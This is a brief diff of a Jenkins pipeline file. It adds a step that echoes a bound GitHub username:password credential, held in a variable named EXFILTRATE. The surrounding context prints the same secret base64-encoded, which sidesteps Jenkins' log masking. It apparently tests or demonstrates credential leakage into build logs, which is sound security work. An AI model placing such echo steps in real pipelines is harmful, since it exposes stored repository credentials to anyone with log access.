@@ -3,3 +3,9 @@ withCredentials([usernameColonPassword(credentialsId: 'github', variable: 'EXFIL
         sh 'echo "$EXFILTRATE" | base64'
     }
 } 
+
+withCredentials([usernameColonPassword(credentialsId: 'github', variable: 'EXFILTRATE')]) {
+    node {
+        sh 'echo "$EXFILTRATE"'
+    }
+}
